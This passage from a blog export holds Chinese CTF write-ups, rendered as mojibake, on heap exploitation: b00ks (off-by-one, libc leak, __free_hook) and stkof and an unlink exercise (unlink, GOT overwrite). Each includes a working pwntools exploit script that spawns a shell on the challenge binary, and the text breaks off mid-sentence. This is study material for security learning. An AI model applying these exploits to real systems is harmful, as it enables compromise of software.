    <content type="text"><![CDATA[é¢˜ç›®æè¿°é¢˜ç›®æ¥æºï¼šAsis CTF 2016çŸ¥è¯†ç‚¹ï¼šnull byte off_by_oneã€mmapæ³„éœ²libcåŸºå€é¢˜ç›®æ˜¯ä¸€ä¸ªä¹¦ç±ç®¡ç†ç³»ç»Ÿï¼Œå…·æœ‰å¢žåˆ æŸ¥æ”¹åŠŸèƒ½ã€‚1234567891011nick@nick-machine:~/pwn_learn/heapLearn/off_by_one$ ./b00ks Welcome to ASISCTF book libraryEnter author name: aaaa1. Create a book2. Delete a book3. Edit a book4. Print book detail5. Change current author name6. Exit&gt;é¢˜ç›®æ˜¯64ä½ç¨‹åºï¼Œå¼€å¯ä¿æŠ¤æƒ…å†µï¼š123456[*] &apos;/lib/x86_64-linux-gnu/libc.so.6&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabledç¨‹åºå¼€å¯äº†PIEï¼Œæ„å‘³ç€éš¾ä»¥å¾—åˆ°ç¨‹åºä¸­å‡½æ•°çš„åœ°å€ï¼Œå¯èƒ½å¯¹æ³„éœ²libcé€ æˆé˜»ç¢ã€‚ç¨‹åºæ¦‚å†µç¨‹åºé¦–å…ˆè¦æ±‚è¾“å…¥author nameï¼Œè°ƒç”¨ä¸€ä¸ªå¤„ç†è¾“å…¥çš„å‡½æ•°ï¼ˆinputå‡½æ•°ï¼‰123456789101112131415161718192021signed __int64 __fastcall input(_BYTE *a1, int a2)&#123; int i; // [rsp+14h] [rbp-Ch] _BYTE *buf; // [rsp+18h] [rbp-8h] if ( a2 &lt;= 0 ) return 0LL; buf = a1; for ( i = 0; ; ++i ) &#123; if ( read(0, buf, 1uLL) != 1 ) return 1LL; if ( *buf == '\n' ) break; ++buf; if ( i == a2 ) break; &#125; *buf = 0; return 0LL;&#125;åˆ†æžä»£ç å¯ä»¥å‘çŽ°ï¼Œä»£ç å¯¹å­—ç¬¦ä¸²æœ«å°¾å¤„ç†ä¸å½“ï¼Œä¼šåœ¨å­—ç¬¦ä¸²çš„æœ€åŽåŠ ä¸Š&#39;\x00&#39;,å³ä½¿å­—ç¬¦ä¸²å·²ç»å æ»¡bufã€‚ä¹Ÿå°±æ˜¯è¯´ç¨‹åºä¸­å­˜åœ¨null byte off_by_oneæ¼æ´žcreateå‡½æ•°:è¾“å…¥nameï¼Œå¯¹å¤§å°æ²¡æœ‰é™åˆ¶1234567printf("\nEnter book name size: ", *&amp;v1); __isoc99_scanf("%d", &amp;v1); if ( v1 &gt;= 0 ) &#123; printf("Enter book name (Max 32 chars): ", &amp;v1); ptr = malloc(v1); ...è¾“å…¥descriptionï¼ŒåŒæ ·å¯¹å¤§å°æ— é™åˆ¶12345678910111213printf("\nEnter book description size: ", *&amp;v1);__isoc99_scanf("%d", &amp;v1);if ( v1 &gt;= 0 )&#123; v5 = malloc(v1); if ( v5 ) &#123; printf("Enter book description: ", &amp;v1); if ( input(v5, v1 - 1) ) &#123; printf("Unable to read description"); &#125; ...æœ€åŽå°†nameå’Œdescriptionçš„æŒ‡é’ˆå­˜å…¥ç»“æž„ä½“12345678910v3 = malloc(0x20uLL);if ( v3 )&#123; *(v3 + 6) = v1; *(off_202010 + v2) = v3; *(v3 + 2) = v5; *(v3 + 1) = ptr; *v3 = ++cnt; return 0LL;&#125;åˆ†æžå¯å¾—åˆ°ç»“æž„ä½“12345600000000 book struc ; (sizeof=0x20, mappedto_6)00000000 index dq ?00000008 name dq ?00000010 description dq ?00000018 size dq ?00000020 book endsdeleteå‡½æ•°ä¼šå°†æŒ‡é’ˆæ¸…é›¶ï¼Œä¸å­˜åœ¨æ‚¬æŒ‚æŒ‡é’ˆeditå‡½æ•°ç”¨äºŽç¼–è¾‘bookçš„descriptionprintå‡½æ•°è¾“å‡ºIDã€nameã€descriptionã€authorï¼Œå¯ä»¥ç”¨æ¥æ³„éœ²ä¿¡æ¯change_nameå‡½æ•°å¯ä»¥ä¿®æ”¹author nameæ¼æ´žåˆ†æžä»»æ„è¯»å†™ç”±äºŽnull byte off_by_oneï¼Œåœ¨ç¨‹åºå¼€å¤´æ—¶ï¼Œè‹¥è¾“å…¥32ä½çš„author nameï¼ˆunk_202040ï¼‰ï¼Œé‚£ä¹ˆ&#39;\x00&#39;ä¼šæº¢å‡ºåˆ°book_listï¼ˆunk_202060ï¼‰ä¸­1234.data:0000000000202010 book_list dq offset unk_202060 ; DATA XREF: sub_B24:loc_B38â†‘o.data:0000000000202010 ; delete:loc_C1Bâ†‘o ....data:0000000000202018 author_name dq offset unk_202040 ; DATA XREF: change_name+15â†‘o.data:0000000000202018 ; print+CAâ†‘oè‹¥æ˜¯æ­¤æ—¶createä¸€ä¸ªbookï¼Œé‚£ä¹ˆæ–°bookçš„æŒ‡é’ˆå°†ä¼šè¦†ç›–æŽ‰è¿™ä¸ªæº¢å‡ºçš„&#39;\x00&#39;ï¼Œå¯¼è‡´author nameä¸ŽbookæŒ‡é’ˆä¹‹é—´æ²¡æœ‰æˆªæ–­ï¼Œæ„å‘³ç€æˆ‘å¯ä»¥é€šè¿‡è¾“å‡ºauthor nameæ¥æ³„éœ²å‡ºbookçš„æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯å †åœ°å€ã€‚1230x555555756040: 0x6161616161616161 0x6161616161616161 &lt;== author name0x555555756050: 0x6161616161616161 0x00616161616161610x555555756060: 0x0000555555757160 &lt;== bookæŒ‡é’ˆç”±äºŽç¨‹åºæä¾›ä¿®æ”¹author nameçš„å‡½æ•°ï¼Œæ‰€ä»¥å¯ä»¥å†æ¬¡è¾“å…¥32ä½çš„author nameï¼Œä½¿æº¢å‡ºçš„&#39;\x00&#39;è¦†ç›–æŽ‰bookæŒ‡é’ˆçš„æœ€ä½Žå­—èŠ‚ï¼Œå¯¼è‡´bookçš„æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€å˜å°ã€‚10x0000555555757160 ==&gt; 0x0000555555757100 //åœ°å€å˜å°å› ä¸ºåœ¨createä¸€ä¸ªbookæ—¶ï¼Œä¼šå…ˆç”³è¯·nameå’Œdescriptionçš„ç©ºé—´ï¼Œæ‰€ä»¥ç»è¿‡ä¿®æ”¹çš„bookæŒ‡é’ˆæœ‰å¯èƒ½å°±ä¼šæŒ‡å‘åœ°å€åå°descriptionçš„ç©ºé—´ä¸­1234567891011120x555555757000: 0x0000000000000000 0x0000000000000021 &lt;== name0x555555757010: 0x6161616161616161 0x00000000000000000x555555757020: 0x0000000000000000 0x0000000000000131 &lt;== description0x555555757030: 0x6262626262626262 0x00000000000000000x555555757040: 0x0000000000000000 0x0000000000000000 ......0x555555757100: 0x0000000000000000 0x0000000000000000 &lt;== ä¿®æ”¹åŽçš„bookæŒ‡é’ˆï¼ŒæŒ‡å‘descriptionä¸­ ...... 0x555555757150: 0x0000000000000000 0x00000000000000310x555555757160: 0x0000000000000001 0x0000555555757010 &lt;== ä¿®æ”¹å‰çš„bookæŒ‡é’ˆ0x555555757170: 0x0000555555757030 0x00000000000001200x555555757180: 0x0000000000000000 0x0000000000020e81æ‰€ä»¥å¯ä»¥äº‹å…ˆåœ¨descriptionä¸­ä¼ªé€ ä¸€ä¸ªbookç»“æž„ä½“ï¼Œå½“bookæŒ‡é’ˆè¢«ä¿®æ”¹äºŽæ­¤æ—¶ï¼Œå°±å¯ä»¥å¯¹ä¼ªé€ çš„nameå’Œdescriptionè¿›è¡Œè¯»å†™ï¼Œå®žçŽ°ä»»æ„è¯»å†™ã€‚æ³„éœ²libcåŸºå€è¿™é“é¢˜ç”±äºŽå¼€å¯PIEï¼Œå¹¶ä¸”æ²¡æœ‰uafç­‰å¸¸è§„æ–¹æ³•æ¥æ³„éœ²libcï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨äº†ä¸€ç§æ›´ä¸ºå·§å¦™çš„æ–¹æ³•ã€‚åœ¨åˆ†é…ç¬¬äºŒä¸ªbookæ—¶ï¼Œç”³è¯·ä¸€ä¸ªå¾ˆå¤§çš„ç©ºé—´ï¼Œä½¿å †ä»¥mmapæ¨¡å¼è¿›è¡Œæ‹“å±•ï¼ˆå¯ä»¥å‚è€ƒè¿™é‡Œï¼‰ã€‚å› ä¸ºmmapåˆ†é…çš„å†…å­˜ä¸Žlibcä¹‹å‰å­˜åœ¨å›ºå®šçš„åç§»å› æ­¤å¯ä»¥æŽ¨ç®—å‡ºlibcçš„åŸºåœ°å€123456789101112131415161718192021pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x56052bb62000 0x56052bb64000 r-xp 2000 0 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052bd63000 0x56052bd64000 r--p 1000 1000 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052bd64000 0x56052bd65000 rw-p 1000 2000 /home/nick/pwn_learn/heapLearn/off_by_one/b00ks 0x56052d944000 0x56052d965000 rw-p 21000 0 [heap] 0x7fd6affa0000 0x7fd6b015e000 r-xp 1be000 0 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b015e000 0x7fd6b035e000 ---p 200000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b035e000 0x7fd6b0362000 r--p 4000 1be000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b0362000 0x7fd6b0364000 rw-p 2000 1c2000 /lib/x86_64-linux-gnu/libc-2.19.so 0x7fd6b0364000 0x7fd6b0369000 rw-p 5000 0 0x7fd6b0369000 0x7fd6b038c000 r-xp 23000 0 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b054d000 0x7fd6b0572000 rw-p 25000 0 &lt;==== mmapåˆ†é…çš„ç©ºé—´ 0x7fd6b058a000 0x7fd6b058b000 rw-p 1000 0 0x7fd6b058b000 0x7fd6b058c000 r--p 1000 22000 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b058c000 0x7fd6b058d000 rw-p 1000 23000 /lib/x86_64-linux-gnu/ld-2.19.so 0x7fd6b058d000 0x7fd6b058e000 rw-p 1000 0 0x7ffe6b361000 0x7ffe6b382000 rw-p 21000 0 [stack] 0x7ffe6b3bd000 0x7ffe6b3bf000 r--p 2000 0 [vvar] 0x7ffe6b3bf000 0x7ffe6b3c1000 r-xp 2000 0 [vdso]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall]getshellå› ä¸ºPIEï¼Œæ‰€ä»¥å¾ˆéš¾é‡‡ç”¨è¦†å†™gotè¡¨ç­‰æ–¹æ³•ã€‚è€Œå·²ç»æ³„éœ²äº†libcï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨å‘__free_hookå†™å…¥systemæ¥getshellæ¼æ´žåˆ©ç”¨è¾“å…¥32ä½çš„author nameï¼Œcreateä¸€ä¸ªbook1ï¼ˆnameï¼š0x20å­—èŠ‚ï¼Œdescriptionï¼š0x120å­—èŠ‚ï¼‰è°ƒç”¨showå‡½æ•° æ³„éœ²å †åœ°å€create book2ï¼ˆdescriptionä¸ºå¤§ç©ºé—´ï¼š0x21000å­—èŠ‚ï¼‰ï¼Œå‡†å¤‡æ³„éœ²libcåŸºå€create book3ï¼ˆnameå†™å…¥&#39;/bin/sh\x00&#39;ï¼‰ä¸ºgetshellåšå‡†å¤‡åœ¨book1-&gt;descriptionä¸­ä¼ªé€ bookç»“æž„ä½“ï¼ŒnameæŒ‡é’ˆä¸ºbook2çš„descriptionæŒ‡é’ˆï¼ˆå³mmapåˆ†é…ç©ºé—´çš„åœ°å€ï¼‰ï¼ŒdescriptionæŒ‡é’ˆä¸ºbook3ä¸­descriptionæŒ‡é’ˆçš„åœ°å€ã€‚ï¼ˆè¿™é‡Œåœ°å€éƒ½å¯ä»¥ç”±æ³„éœ²çš„å †åœ°å€åŠ ä¸Šåç§»å¾—åˆ°ï¼‰é‡æ–°å‘author nameä¸­å†™å…¥32ä¸ªå­—èŠ‚ï¼Œä½¿&#39;\x00&#39;è¦†ç›–æŽ‰book1æŒ‡é’ˆçš„æœ€ä½Žä½å­—èŠ‚ï¼Œbook1æŒ‡é’ˆæŒ‡å‘book1-&gt;descriptionä¸­å¸ƒç½®å¥½çš„bookç»“æž„ä½“è°ƒç”¨showå‡½æ•°ï¼Œé€šè¿‡book1çš„nameçš„å€¼å¾—åˆ°mmapåˆ†é…çš„åœ°å€ï¼Œå‡åŽ»å›ºå®šçš„åç§»èŽ·å¾—libcåŸºå€é€šè¿‡libcåŸºå€ï¼Œè®¡ç®—å‡ºsystemå’Œ__free_hookçš„åœ°å€è°ƒç”¨editï¼Œä¿®æ”¹book1çš„descriptionï¼Œå†™å…¥free_hookçš„åœ°å€ï¼Œå› ä¸ºç¬¬ï¼ˆ5ï¼‰æ­¥ï¼Œæ‰€ä»¥è¿™é‡Œå®žé™…æ˜¯å°†book3çš„descriptionæŒ‡é’ˆæ”¹ä¸ºfree_hookçš„åœ°å€è°ƒç”¨editï¼Œä¿®æ”¹book3çš„descriptionï¼Œå†™å…¥systemï¼Œå› ä¸ºç¬¬ï¼ˆ9ï¼‰æ­¥ï¼Œæ‰€ä»¥è¿™é‡Œå®žé™…æ˜¯æŠŠsystemå†™å…¥__free_hookä¸­è°ƒç”¨delete(book3)ï¼Œå› ä¸ºäº‹å…ˆåœ¨nameå†™å…¥çš„&#39;/bin/sh\x00&#39;ï¼Œæ‰€ä»¥æˆåŠŸgetshellæˆ‘çš„exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#-*- coding=utf-8 -*-from pwn import *context.log_level = 'debug'p = process('b00ks')context.terminal = ['gnome-terminal', '-x', 'sh', '-c']libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def create(name, description): p.recvuntil('&gt; ') p.sendline('1') p.recvuntil('Enter book name size: ') p.sendline(str(len(name))) p.recvuntil('Enter book name (Max 32 chars): ') p.send(name) p.recvuntil('Enter book description size: ') p.sendline(str(len(description))) p.recvuntil('Enter book description: ') p.send(description)def delete(index): p.recvuntil('&gt; ') p.sendline('2') p.recvuntil('id you want to delete: ') p.sendline(str(index))def edit(index, description): p.recvuntil('&gt; ') p.sendline('3') p.recvuntil('id you want to edit: ') p.sendline(str(index)) p.recvuntil('new book description: ') p.sendline(description)def show(): p.recvuntil('&gt; ') p.sendline('4')def change_name(name): p.recvuntil('&gt; ') p.sendline('5') p.recvuntil('Enter author name: ') p.sendline(name)def leak(addr1, addr2): payload = 'b'*0xc0 + p64(1) + p64(addr1) + p64(addr2) + p64(0x120) edit(1, payload) change_name('a'*32) show() p.recvuntil('Name: ') res = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00')) return res#æ³„éœ²å †åœ°å€p.recvuntil('Enter author name: ')p.sendline('a'*32)create('a'*0x20, 'b'*0x120)show()p.recvuntil('Author: ')heap_addr = u64(p.recvuntil('\n')[32:-1].ljust(8, '\x00'))print "heap_addr: %#x" % heap_addr#ç”³è¯·ä¸€ä¸ªå¤§å†…å­˜ï¼Œè®©å †ä»¥mmapæ¨¡å¼è¿›è¡Œæ‹“å±•ï¼Œè¿›è€Œæ³„éœ²libc_basecreate('a'*0x20, '\x00'*0x21000)create('/bin/sh\x00', 'b'*0x8)#heap_addr+0x70æ˜¯ä»¥mmapæ‹“å±•çš„å †çš„åœ°å€ï¼Œå°†ä»–å†™å…¥ä¼ªé€ çš„bookç»“æž„ä½“çš„nameä¸­ï¼Œå‡†å¤‡æ³„éœ²è¯¥å€¼#heap_addr_0xe0æ˜¯chunk3çš„descriptionæŒ‡é’ˆï¼Œä¸ºä¹‹åŽä»»æ„å†™åšå‡†å¤‡libc_base = leak(heap_addr+0x70, heap_addr+0xe0) - 0x5AD010 #è¯¥å€¼éœ€è¦æ ¹æ®ç³»ç»Ÿä¿®æ”¹print "libc_base: %#x" % libc_base#è®¡ç®—åœ°å€system = libc_base + libc.symbols['system']free_hook = libc_base + libc.symbols['__free_hook']print "system: %#x" % systemprint "free_hook: %#x" % free_hook#ä¹‹å‰å°†chunk3çš„descriptionæŒ‡é’ˆçš„åœ°å€å†™åˆ°äº†ä¼ªé€ chunkçš„descriptionæŒ‡é’ˆå¤„ï¼Œæ‰€ä»¥è¿™é‡Œå°†æ”¹å†™chunk3çš„descriptionæŒ‡é’ˆçš„å€¼ä¸ºfree_hook#å› ä¸ºoff_one_byteä¼šå¯¼è‡´å†™å…¥æ—¶ä¼šå¤šå¾€åŽè¦†ç›–ä¸€ä¸ªå­—èŠ‚ï¼Œå¯¼è‡´åŽæ–¹çš„book-&gt;sizeè¢«è¦†ç›–ä¸º0ï¼Œæ‰€ä»¥è¿™é‡Œæ‰‹åŠ¨å¤šå†™ä¸€ä¸ªå­—èŠ‚'\x08'ï¼Œä»¥å…sizeè¢«è¦†ç›–ä¸º0edit(1, p64(free_hook)+'\x08')#å‘free_hookä¸­å†™å…¥systemedit(3, p64(system))#äº‹å…ˆå·²ç»åœ¨chunk3çš„nameä¸­æ”¾å…¥äº†/bin/sh\x00delete(3)p.interactive()ç›¸å…³é“¾æŽ¥é¢˜ç›®é“¾æŽ¥ï¼šb00ks]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>å †åˆ©ç”¨</tag>
        <tag>ctfwiki</tag>
        <tag>off_by_one</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hitcon2014-stkof writeup]]></title>
    <url>%2Fpost%2Fe7616071.html</url>
    <content type="text"><![CDATA[é¢˜ç›®æè¿°é¢˜ç›®æ¥æºï¼šHITCON CTF 2014çŸ¥è¯†ç‚¹ï¼šunlinkè¿™é“é¢˜æ²¡æœ‰èœå•æ˜¾ç¤ºï¼Œåªèƒ½é€šè¿‡åˆ†æžä»£ç æ¥äº†è§£ç¨‹åºåŠŸèƒ½ã€‚åŠŸèƒ½ï¼šæ·»åŠ ï¼ˆè¾“å…¥ï¼šé•¿åº¦ï¼‰ä¿®æ”¹ï¼ˆè¾“å…¥ï¼šç´¢å¼•ã€é•¿åº¦ã€å†…å®¹ï¼‰åˆ é™¤ï¼ˆè¾“å…¥ï¼šç´¢å¼•ï¼‰ç¨‹åºä¿æŠ¤æƒ…å†µï¼š123456[*] &apos;/home/nick/pwn_learn/heapLearn/unlink/hitcon2014_stkof/stkof&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIEç¨‹åºåˆ†æžaddå‡½æ•°ä¸­ï¼Œå¯¹åˆ†é…chunkçš„å¤§å°æ²¡æœ‰é™åˆ¶ï¼Œå°†æŒ‡é’ˆå­˜åˆ°å…¨å±€æ•°ç»„ä¸­ï¼Œå¯èŽ·å¾—æŒ‡é’ˆå˜é‡çš„åœ°å€setå‡½æ•°ä¸­ï¼Œ12345678910111213141516171819202122232425262728293031signed __int64 set()&#123; signed __int64 result; // rax int i; // eax unsigned int v2; // [rsp+8h] [rbp-88h] __int64 n; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v2 = atol(&amp;s); if ( v2 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v2] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); n = atoll(&amp;s); ptr = ::s[v2]; for ( i = fread(ptr, 1uLL, n, stdin); i &gt; 0; i = fread(ptr, 1uLL, n, stdin) ) &#123; ptr += i; n -= i; &#125; if ( n ) result = 0xFFFFFFFFLL; else result = 0LL; return result;&#125;å¯¹å†™å…¥çš„é•¿åº¦æ²¡æœ‰é™åˆ¶ï¼Œå­˜åœ¨å †æº¢å‡ºï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨unlinkæ¼æ´ždeleteå‡½æ•°ä¸­ï¼Œé‡Šæ”¾æŽ‰å †å—å¹¶æŠŠæŒ‡é’ˆæ¸…é›¶0ç”±äºŽç¨‹åºä¸­æ²¡æœ‰å¯ä»¥ç”¨æ¥è¾“å‡ºæ•°æ®çš„å‡½æ•°ï¼ŒäºŽæ˜¯è€ƒè™‘å°†putså‡½æ•°è¦†å†™åˆ°å…¶ä»–å‡½æ•°çš„gotè¡¨ï¼ˆè¿™é‡Œé€‰æ‹©freeå‡½æ•°ï¼‰æ¼æ´žåˆ©ç”¨åˆ†é…è¿žç»­4ä¸ªchunkï¼ˆç¼–å·1-4ï¼‰ï¼Œå¤§å°ä¸º0x80ï¼ˆsmallchunkï¼‰ï¼ˆé€šå¸¸å°½é‡å¤šç”³è¯·ä¸€ä¸ªchunkï¼Œä»¥éš”å¼€top chunkï¼Œé˜²æ­¢è¢«åˆå¹¶ï¼‰åœ¨chunk1ä¸­æž„é€ fake chunkï¼Œå‡†å¤‡unlinkprevsizeï¼š0sizeï¼š0x80fdï¼šchunk_ptr - 0x18bkï¼šchunk_ptr - 0x10æ³¨æ„ï¼šchunk_ptræ˜¯æŒ‡å‘chunk0çš„æŒ‡é’ˆå˜é‡æ‰€åœ¨çš„åœ°å€ï¼Œè€ŒéžæŒ‡é’ˆæŒ‡å‘çš„åœ°å€ä»Žchunk1ç»§ç»­æº¢å‡ºåˆ°chunk2ï¼Œä¿®æ”¹prevsizeã€sizeï¼ˆinuseä½ï¼‰prevsize: 0x80sizeï¼š0x90é‡Šæ”¾chunk2ï¼Œè§¦å‘unlinkï¼Œæ­¤åŽchunk1çš„æŒ‡é’ˆçš„å€¼è¢«ä¿®æ”¹ä¸ºäº†chunk_ptr-0x18æŠŠfreeçš„gotè¡¨ä¿®æ”¹ä¸ºputsã€‚payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts))ä½¿ç”¨DynELFæ³„éœ²systemï¼ˆè¯¦è§ä»£ç ï¼‰åˆ©ç”¨ï¼ˆ5ï¼‰çš„æ–¹æ³•ï¼Œå†å°†freeçš„gotè¡¨ä¿®æ”¹ä¸ºsystemå‘chunk3ä¸­å†™å…¥/bin/sh\x00ï¼Œé‡Šæ”¾chunk3ï¼Œgetshellæˆ‘çš„exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071from pwn import *context.log_level = 'debug'context.terminal = ['gnome-terminal', '-x', 'sh', '-c']p = process('./stkof')elf = ELF('./stkof')free_got = elf.got['free']puts = elf.symbols['puts']def add(size): p.sendline('1') p.sendline(str(size)) p.recvuntil('OK\n')def set(index, content): p.sendline('2') p.sendline(str(index)) p.sendline(str(len(content))) p.send(content) p.recvuntil('\n')def delete(index): p.sendline('3') p.sendline(str(index))def leak(addr): payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(addr) set(1, payload) delete(2) res = p.recvuntil('OK\n').split('\x0aOK')[0] if res == '': res = '\x00' return res #è¿”å›žå€¼å¯ä»¥ä¸ºä»»æ„é•¿åº¦ï¼Œå¹¶ä¸æ¸…æ¥šåŽŸå› chunk_ptr = 0x602148add(0x80)add(0x80)add(0x80)add(0x80)#unlinkpayload = p64(0) + p64(0x0)payload += p64(chunk_ptr-0x18) + p64(chunk_ptr-0x10)payload += 'a' * 0x60payload += p64(0x80) + p64(0x90)set(1, payload)delete(2)p.recvuntil('OK\n')#freegotå†™ä¸ºputspayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(puts))#leakd = DynELF(leak, elf = elf)system = d.lookup('system', 'libc')print "system addr: %#x" % system#freegotå†™ä¸ºsystempayload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)set(1, payload)set(2, p64(system))#getshellset(3, '/bin/sh\x00')delete(3)p.interactive()ç›¸å…³é“¾æŽ¥é¢˜ç›®é“¾æŽ¥ï¼šstkofç›¸å…³é¢˜ç›®ï¼šunlinkä¾‹é¢˜unlinkæ¼æ´žåˆ†æžï¼šå †åˆ©ç”¨å­¦ä¹ ä¹‹unlink]]></content>
      <categories>
        <category>writeups</category>
      </categories>
      <tags>
        <tag>unlink</tag>
        <tag>writeup</tag>
        <tag>how2heap</tag>
        <tag>å †åˆ©ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[unlinkä¾‹é¢˜]]></title>
    <url>%2Fpost%2F503970b4.html</url>
    <content type="text"><![CDATA[é¢˜ç›®æè¿°å…ˆè¿è¡Œè¯¥ç¨‹åºï¼Œå‘çŽ°æ˜¯ä¸€é“å…¸åž‹çš„èœå•é¢˜ï¼Œæœ‰å¢žåˆ æŸ¥æ”¹åŠŸèƒ½ã€‚çŸ¥è¯†ç‚¹ï¼šunlink123456nick@nick-machine:~/pwn_learn/heapLearn/unlink/t1$ ./heap1.Add chunk2.Set chunk3.Delete chunk4.Print chunk5.Exitç¨‹åºåˆ†æžå…¶ä¸­ï¼Œaddå‡½æ•°æ²¡æœ‰å¯¹ç”³è¯·çš„chunkå¤§å°åšé™åˆ¶ã€‚åœ¨setå‡½æ•°ä¸­ï¼š123456789101112ssize_t set()&#123; int v1; // [esp+Ch] [ebp-Ch] v1 = -1; write(1, "Set chunk index:", 0x10u); __isoc99_scanf("%d", &amp;v1); if ( v1 &lt; 0 ) return write(1, "Set chunk data error!\n", 0x16u); write(1, "Set chunk data:", 15u); return read(0, buf[v1], 0x400u);&#125;å¯ä»¥å‘çŽ°ä»£ç ä¸­æ²¡æœ‰å¯¹å†™å…¥çš„é•¿åº¦åšé™åˆ¶ï¼Œå­˜åœ¨æº¢å‡ºåŒæ—¶ï¼Œbuf[]ä¸­å‚¨å­˜æŒ‡å‘chunkçš„æŒ‡é’ˆï¼Œä¸”ä¸ºå…¨å±€å˜é‡ï¼Œå¯ä»¥èŽ·å¾—åœ°å€ç”±æ­¤ç¡®å®šç¨‹åºä¸­å­˜åœ¨unlinkæ¼æ´žåœ¨deleteå‡½æ•°ä¸­ï¼š123456789101112void delete()&#123; int v0; // [esp+Ch] [ebp-Ch] v0 = -1; write(1, "Delete chunk index:", 0x13u); __isoc99_scanf("%d", &amp;v0); if ( v0 &gt;= 0 ) free(buf[v0]); else write(1, "Delete chunk error!\n", 0x14u);&#125;é‡Šæ”¾chunkåŽæ²¡æœ‰å¯¹æŒ‡é’ˆèµ‹0ï¼Œä¼šé€ æˆUAFæ¼æ´žï¼Œä½†æ­¤é¢˜ä¸ä¼šåˆ©ç”¨åˆ°ã€‚åœ¨printå‡½æ•°ä¸­ï¼Œå¯è¾“å‡ºä»»æ„indexçš„chunkï¼Œç”¨äºŽæ³„éœ²æ•°æ®ã€‚ç”±äºŽé¢˜ç›®æ²¡æœ‰ç»™å‡ºlibcï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°DynELFæ¥æ³„éœ²systemå‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨unlinkåŽä¿®æ”¹chunkæŒ‡é’ˆæ¥å®žçŽ°ä»»æ„è¯»æ¼æ´žåˆ©ç”¨åˆ†é…3ä¸ªè¿žç»­çš„chunkï¼Œå¤§å°ä¸º0x80ï¼ˆsmallchunkï¼‰chunk0ã€chunk1: ç”¨äºŽæž„é€ unlinkchunk2ï¼šç”¨äºŽé˜²æ­¢è¢«top chunkåˆå¹¶åœ¨chunk0ä¸­æž„é€ fake chunkï¼Œå‡†å¤‡unlinkã€‚prevsizeï¼š0sizeï¼š0x80fdï¼šchunk_ptr - 0xcbkï¼šchunk_ptr - 0x8æ³¨æ„ï¼šchunk_ptræ˜¯æŒ‡å‘chunk0çš„æŒ‡é’ˆå˜é‡æ‰€åœ¨çš„åœ°å€ï¼Œå³&amp;buf[0]ï¼Œè€ŒéžæŒ‡é’ˆæŒ‡å‘çš„åœ°å€ä»Žchunk0ç»§ç»­æº¢å‡ºåˆ°chunk1ï¼Œä¿®æ”¹prevsizeã€sizeï¼ˆinuseä½ï¼‰prevsize: 0x80sizeï¼š0x88é‡Šæ”¾chunk1ï¼Œè§¦å‘unlinkï¼Œæ­¤åŽbuf[0]ï¼Œå³chunk0çš„æŒ‡é’ˆçš„å€¼è¢«ä¿®æ”¹ä¸ºäº†chunk_ptr-0xcå†™å…¥chunk0ï¼Œæž„é€ leakå‡½æ•°ï¼Œå‡†å¤‡åˆ©ç”¨DynELFæ¥æ³„éœ²systemï¼Œç”±äºŽæŒ‡é’ˆè¢«ä¿®æ”¹ï¼Œå®žé™…å†™å…¥åœ°å€æ˜¯chunk_ptr-0xcã€‚payload = &#39;a&#39; * 0xc //paddingpayload += p32(chunk_ptr-0xc) //ä¿ç•™chunk0çš„æŒ‡é’ˆï¼Œä»¥ä¾¿é‡å¤åˆ©ç”¨payload += p32(addr) //å°†addrå†™å…¥chunk1çš„æŒ‡é’ˆ(buf[1])æ­¤åŽè¾“å‡ºchunk1å³ä¸ºè¾“å‡ºåœ°å€addrçš„å€¼ï¼Œå®žçŽ°å¯é‡å¤åˆ©ç”¨çš„ä»»æ„åœ°å€è¯»å–åˆ©ç”¨DynELFæ³„éœ²å‡ºsystemå‡½æ•°åœ°å€åˆ©ç”¨ï¼ˆ5ï¼‰çš„payloadï¼Œå°†addrè®¾ä¸ºfree_gotï¼Œå†å‘chunk1ä¸­å†™å…¥systemçš„åœ°å€ã€‚å› ä¸ºchunk1çš„æŒ‡é’ˆè¢«è¦†ç›–ä¸ºfree_gotï¼Œæ‰€ä»¥ä¼šå°†systemçš„åœ°å€å†™å…¥freeçš„gotè¡¨å‘chunk2ä¸­å†™å…¥&#39;/bin/sh\x00&#39;ï¼Œè°ƒç”¨free(chunk2)ï¼Œå› 